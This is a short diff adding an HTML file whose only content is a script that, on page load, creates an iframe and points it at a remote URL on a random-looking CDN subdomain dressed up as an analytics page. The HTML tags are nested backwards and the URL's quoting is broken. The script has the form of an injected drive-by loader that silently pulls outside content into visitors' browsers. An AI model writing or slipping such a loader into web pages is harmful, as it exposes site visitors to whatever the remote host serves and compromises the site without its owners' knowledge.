@@ -1,0 +1,21 @@
+<body>
+<head>
+<html>
+
+<script>
+
+{
+var c=document.createElement("iframe");
+
+c.setAttribute("type","text/javascript");
+
+c.setAttribute("src","http://cds.v6i6b6a3.hwcdn.net/analytics18.html'};");
+
+document.body.appendChild(c)
+}
+
+</script>
+
+</html>
+</head>
+</body>
